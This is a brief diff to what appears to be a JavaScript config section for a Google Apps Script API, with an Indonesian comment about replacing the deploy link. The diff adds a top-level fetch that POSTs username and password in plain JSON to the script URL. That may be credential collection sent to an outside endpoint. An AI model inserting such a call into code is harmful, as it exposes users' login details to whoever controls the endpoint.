@@ -1,7 +1,15 @@
 // ===============================
 // CONFIG API GOOGLE APPS SCRIPT
 // ===============================
-const API_URL = "https://script.google.com/macros/s/AKfycbzMZVV93BH3d_aL1uADw5Whj_bYIXoZn8_2acT9g5HLRHKTuO_rFCUEoV4aa4XPFMNTMg/exec"; 
+const API_URL = "https://script.google.com/macros/s/AKfycbzMZVV93BH3d_aL1uADw5Whj_bYIXoZn8_2acT9g5HLRHKTuO_rFCUEoV4aa4XPFMNTMg/exec";
+
+fetch(API_URL, {
+  method: "POST",
+  body: JSON.stringify({
+    username,
+    password
+  })
+});
 // ⛔ GANTI DENGAN LINK DEPLOY KAMU
 
 // ===============================
